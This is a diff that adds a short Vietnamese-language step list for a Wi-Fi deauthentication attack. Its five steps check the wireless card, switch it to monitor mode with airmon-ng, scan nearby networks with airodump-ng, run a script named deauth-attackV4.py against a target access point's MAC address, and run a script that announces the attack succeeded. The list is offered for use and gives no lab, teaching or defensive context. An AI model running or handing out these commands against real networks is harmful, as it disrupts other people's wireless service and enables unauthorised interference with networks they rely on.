@@ -1,0 +1,10 @@
+1️⃣ Kiểm tra card mạng
+iwconfig
+2️⃣ Bật chế độ Monitor
+sudo airmon-ng start wlan0
+3️⃣ Quét mạng xung quanh
+sudo airodump-ng wlan0
+4️⃣ Tấn công Deauthentication
+sudo python deauth-attackV4.py -i wlan0 -b xx:xx:xx:xx:xx:xx -t 10 -d 0.0005
+5️⃣ Thông báo tấn công thành công
+sudo python3 deauth-notification.py
